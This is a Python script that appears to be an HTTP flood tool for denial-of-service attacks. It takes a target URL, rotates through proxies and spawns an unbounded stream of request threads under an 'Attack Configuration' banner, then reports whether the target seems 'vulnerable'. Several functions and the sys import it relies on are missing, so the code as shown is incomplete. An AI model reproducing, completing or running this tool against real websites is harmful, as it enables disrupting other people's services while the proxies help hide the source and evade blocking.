import requests
import threading
import time
import os
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.align import Align
import signal

console = Console()

def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies

def select_random_proxy(proxies):
    import random
    return random.choice(proxies) if proxies else None

def send_request(url, thread_id, stats, progress, proxies=None):
    if not stats.active:
        return
        
    try:
        start_time = time.time()
        response = requests.get(url, timeout=1, proxies=proxies)
        end_time = time.time()
        response_time = end_time - start_time
        
        stats.total_requests += 1
        if response.status_code == 200:
            stats.successful_requests += 1
        
        stats.total_time += response_time
        status_panel = Panel(
            f"[bold white]Response:[/] [cyan]{response.status_code}[/]\n[bold white]Time:[/] [blue]{response_time:.3f}s[/]",
            title=f"[bold green]Thread #{thread_id:03d}[/]",
            border_style="bright_yellow",
            padding=(0, 1)
        )
        progress.console.print(status_panel)
        
    except requests.exceptions.Timeout:
        stats.timeouts += 1
        error_panel = Panel(
            "[bold yellow]REQUEST TIMEOUT[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)
    except requests.exceptions.ConnectionError:
        stats.failed_connections += 1
        error_panel = Panel(
            "[bold red]CONNECTION FAILED[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)
    except Exception as e:
        stats.other_errors += 1
        error_panel = Panel(
            f"[bold red]ERROR: {str(e)}[/]",
            title=f"[bold red]Thread #{thread_id:03d}[/]",
            border_style="red",
            padding=(0, 1)
        )
        progress.console.print(error_panel)

def main():
    clear_screen()
    print_banner()
    
    url = console.input("\n[bright_yellow][[/][bold white]TARGET[/][bright_yellow]][/] [bold cyan]Enter URL:[/] ")
    delay = console.input("[bright_yellow][[/][bold white]SPEED[/][bright_yellow]][/] [bold cyan]Enter delay (0.1-1 sec, default: 0.1):[/] ")
    
    try:
        delay = float(delay)
        if not (0.1 <= delay <= 1):
            delay = 0.1
    except ValueError:
        delay = 0.1

    proxies = load_proxies('proxies.txt')
    
    clear_screen()
    print_banner()
    
    attack_config = f"""[bold white]Target[/] : {url}
[bold white]Mode[/]   : Unlimited Threads
[bold white]Speed[/]  : {delay}s delay
[bold white]Proxies[/] : Loaded from file"""

    console.print(Panel(
        attack_config,
        title="[bold red]Attack Configuration[/]",
        border_style="bright_yellow",
        padding=(1, 2)
    ))

    stats = Stats()
    signal.signal(signal.SIGINT, signal_handler)
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]Running attack...[/]"),
        BarColumn(pulse_style="red"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        try:
            thread_id = 1
            while stats.active:
                proxy = select_random_proxy(proxies )
                thread = threading.Thread(
                    target=send_request,
                    args=(url, thread_id, stats, progress, {"http": proxy, "https": proxy} if proxy else None)
                )
                thread.daemon = True
                thread.start()
                thread_id += 1
                time.sleep(delay)
                
        except KeyboardInterrupt:
            stats.active = False
            console.print("\n[bold yellow]⚠ Attack stopped by user[/]")
        finally:
            time.sleep(1)
            console.print("\n")
            console.print(create_results_display(stats))
            
            if stats.total_requests > 0:
                vulnerability = "Target appears to be [bold green]vulnerable[/]!" if stats.successful_requests / stats.total_requests > 0.8 \
                    else "Target appears to be [bold yellow]resistant[/] to the attack."
                console.print(Panel(
                    vulnerability,
                    title="[bold red]Analysis Result[/]",
                    border_style="bright_yellow",
                    padding=(1, 2)
                ))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n[bold red]Fatal Error: {str(e)}[/]")
        sys.exit(1)
